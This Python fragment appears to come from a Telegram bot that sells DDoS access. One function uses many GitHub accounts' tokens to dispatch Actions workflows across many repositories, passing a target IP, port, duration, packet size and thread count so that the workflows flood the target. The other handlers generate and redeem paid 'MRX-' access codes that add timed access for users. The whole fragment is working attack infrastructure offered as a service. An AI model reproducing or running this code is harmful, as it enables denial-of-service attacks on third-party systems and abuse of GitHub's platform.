async def trigger_all_workflows_async(ip, port, duration):
    params = {"ref": "main", "inputs": {"ip": str(ip), "port": str(port), "duration": str(duration), "packet_size": "64", "threads": "150"}}
    async with aiohttp.ClientSession() as session:
        tasks = []
        for account in GITHUB_ACCOUNTS:
            headers = {"Authorization": f"Bearer {account['token']}", "Accept": "application/vnd.github.v3+json"}
            for repo in account['repos']:
                url = f"https://api.github.com/repos/{repo}/actions/workflows/main.yml/dispatches"
                tasks.append(session.post(url, headers=headers, json=params, timeout=10))
        await asyncio.gather(*tasks, return_exceptions=True)

# --- COMMAND HANDLERS ---

async def gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin only: /gen <amount> <d/m>"""
    if update.effective_user.id != ADMIN_ID: return
    try:
        amount = int(context.args[0])
        unit = context.args[1].lower() # 'd' for days, 'm' for minutes
        
        seconds = amount * 86400 if unit == 'd' else amount * 60
        code = "MRX-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        
        active_referral_codes[code] = seconds
        await update.message.reply_text(f"🎫 **CODE GENERATED**\n\nCode: `{code}`\nValue: {amount}{unit}\n\nUser can claim via: `/reffer {code}`", parse_mode="Markdown")
    except:
        await update.message.reply_text("Usage: `/gen 30 d` or `/gen 10 m`")

async def reffer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """User: /reffer <code>"""
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("Usage: /reffer <referral_code>")
        return
    
    code = context.args[0]
    if code in active_referral_codes:
        seconds_to_add = active_referral_codes.pop(code)
        approve_user_logic(user_id, seconds_to_add)
        
        expiry = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(approved_users[user_id]['expiry_time']))
        await update.message.reply_text(f"✅ **CODE REDEEMED!**\nAccess added. New Expiry:\n`{expiry}`", parse_mode="Markdown")
    else:
        await update.message.reply_text("❌ Invalid or already used code.")

